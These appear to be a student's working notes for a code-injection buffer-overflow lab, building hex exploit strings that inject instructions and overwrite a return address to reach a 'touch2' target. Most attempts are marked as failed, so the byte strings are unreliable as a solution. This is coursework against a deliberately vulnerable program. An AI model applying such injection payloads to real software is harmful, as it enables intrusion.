@@ -1,0 +1,86 @@
+00 00 00 00 00 40 18 c0 // address of touch2
+
+0x00 00 00 00 00 40 18 8f // use this adress to inject? doneNO
+55 67 64 48 instead? nerp NO 
+
+
+code:48 8b 3c 25 da 95 a0 //this goes on top (have to trnalsate to endianness) in final exploit string done
+
+
+
+
+
+48 8b 3c 25 da 95 a0        //74 c3
+74 00 00 00 00 00 00
+c3 00 00 00 00 00 00
+00 00 00 00 00 00 00
+00 00 00 00 00 00 00
+f8 63 67 55 00 00 00
+c0 18 40 00 00 00 00
+
+
+
+****Added two rows of zeros as to convert to his examp*****
+My Cookie is :0x74a095da
+
+********0x556763f8 (change f8 to f9) and make this adress to inject
+
+
+
+1) Address to Inject is almost guranteed to be correct
+2) Address of touch2 is correct
+ - this means that bottom two rows are correct
+
+Variables:
+how many rows? PRETTY SURE ITS LARGER VERSION
+what to do about 74 and c3
+
+48 8b 3c 25 da 95 a0        //this failed as well as its added 2 row counterpart
+74 00 00 00 00 00 00
+c3 00 00 00 00 00 00
+00 00 00 00 00 00 00
+00 00 00 00 00 00 00
+f8 63 67 55 00 00 00
+c0 18 40 00 00 00 00
+
+48 8b 3c 25 da 95 a0        //failed as well as its added 2 row counter part
+00 00 00 00 00 00 00
+00 00 00 00 00 00 00
+00 00 00 00 00 00 00
+00 00 00 00 00 00 00
+f8 63 67 55 00 00 00
+c0 18 40 00 00 00 00
+
+48 8b 3c 25 da 95 a0 74 // both versions failed
+c3 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+f8 63 67 55 00 00 00 00
+c0 18 40 00 00 00 00 00
+
+48 8b 3c 25 da 95 a0 74 // Both failed
+c3 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+f9 63 67 55 00 00 00 00
+c0 18 40 00 00 00 00 00
+
+1) check where u got 2nd last row from 
+2) change f8 to f9
+
+48 8b 3c 25 da 95 a0 74 // tested deleting 48,8b 25,,3c,c3, da,95, a0, 74
+c3 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+f9 63 67 55 00 00 00 00
+c0 18 40 00 00 00 00 00
+
